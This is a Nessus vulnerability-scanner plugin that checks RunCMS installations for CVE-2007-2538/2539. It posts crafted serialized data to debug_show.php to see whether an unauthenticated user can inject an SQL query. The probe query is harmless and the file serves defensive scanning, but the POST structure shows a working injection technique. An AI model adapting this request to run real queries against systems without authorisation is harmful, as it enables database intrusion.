#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(25169);
  script_version("$Revision: 1.16 $");

  script_cve_id("CVE-2007-2538", "CVE-2007-2539");
  script_bugtraq_id(23819);
  script_osvdb_id(35782, 35783);

  script_name(english:"RunCMS < 1.5.3 debug_show.php Multiple Vulnerabilities");
  script_summary(english:"Tries to manipulate a SQL query in RunCMS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by
several issues." );
 script_set_attribute(attribute:"description", value:
"The installed version of RunCMS fails to validate input to the
'class/debug/debug_show.php' script.  An unauthenticated attacker may
be able to leverage this issue to manipulate SQL queries or to
determine information about local files on the affected host." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/467665/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://www.runcms.org/news/23.html" );
 script_set_attribute(attribute:"solution", value:
"Apply BugFix 20070504 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2007/05/08");
 script_set_attribute(attribute:"vuln_publication_date", value: "2007/05/04");
 script_cvs_date("$Date: 2016/05/13 15:33:29 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2016 Tenable Network Security, Inc.");

  script_dependencies("runcms_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/runcms");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/runcms"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];
  url = string(dir, "/class/debug/debug_show.php");

  # Make sure the affected script exists.
  r = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(r)) exit(0);
  res = r[2];

  # If so...
  if ("RunCms" >< res)
  {
    # See if we can make a query.
    #
    # nb: the fix requires authentication before processing the POST data
    #     so the particular SQL query used here doesn't really matter.
    exploit = string("SELECT nessus", unixtime());
    postdata = string(
      "debug_show=show_queries&",
      "sorted=1&",
      "executed_queries=a:1:{i:0;s:", strlen(exploit), ':"', exploit, '";}'
    );
    r = http_send_recv3(method: "POST", item: url, port: port,
      content_type: "application/x-www-form-urlencoded", data: postdata);
    if (isnull(r)) exit(0);
    res = r[2];

    # If so...
    if (string("class='bg3'>", exploit, "<") >< res)
    {
      security_hole(port);
      exit(0);
    }
  }
}
